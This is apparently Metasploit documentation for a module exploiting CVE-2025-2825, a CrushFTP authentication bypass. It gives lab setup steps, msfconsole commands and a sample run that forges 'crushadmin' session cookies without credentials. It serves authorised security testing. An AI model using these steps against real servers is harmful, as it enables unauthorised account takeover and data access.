## Vulnerable Application
This module leverages an authentication bypass in CrushFTP 11 < 11.3.1 and 10 < 10.8.4. Attackers
with knowledge of a valid username can provide a crafted S3 authentication header to the CrushFTP web API
to authenticate as that user without valid credentials. When successfully executed, the exploit will
output working session cookies for the target user account. This vulnerability is tracked as CVE-2025-2825.
More information can be found in the [Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/k0EgiL9Psz/cve-2025-2825/rapid7-analysis).

## Options

### TARGETUSER
The target account to forge a session cookie for (default: crushadmin).

## Testing
To set up a test environment:
1. Download a vulnerable 11.3.0 'CrushFTP.jar' file (SHA256: 6fbca7826d967bc56effb376743ff7921df907c576da74252844db9aeb0385a4).
2. Configure `CRUSH_DIR` in `crushftp_init.sh` to point to the correct install directory.
3. Execute `java -jar CrushFTP.jar` to show a local client GUI interface that can be used to set up an admin account.
4. Execute `sudo crushftp_init.sh start` to launch the software on Linux or Mac. If on Windows, run `CrushFTP.exe` as an administrator.
5. Follow the verification steps below.

## Verification Steps
1. Start msfconsole
2. `use auxiliary/gather/crushftp_authbypass_cve_2025_2825`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `set TARGETUSER <TARGET_USER>`
7. `run`

## Scenarios
### CrushFTP on Windows, Linux, or Mac
```
msf6 > use auxiliary/gather/crushftp_authbypass_cve_2025_2825
msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RHOSTS 192.168.181.129
RHOSTS => 192.168.181.129
msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > set TARGETUSER crushadmin
TARGETUSER => crushadmin
msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > show options

Module options (auxiliary/gather/crushftp_authbypass_cve_2025_2825):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.168.181.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       8080             yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI path to CrushFTP
   TARGETUSER  crushadmin       yes       The target account to forge a session cookie for
   VHOST                        no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > run
[*] Running module against 192.168.181.129

[*] Confirming the target is a CrushFTP web service
[*] Attempting to bypass authentication
[+] The target returned the expected empty response and is likely vulnerable
[*] Attempting to access an authenticated API endpoint with the malicious session cookie
[+] Authentication bypass succeeded! Cookie string generated
Cookie: CrushAuth=1743641873_PrrQtXKr3iuXBCqQIPcIbfx20w5uW3; currentAuth=5uW3

[*] Auxiliary module execution completed
```
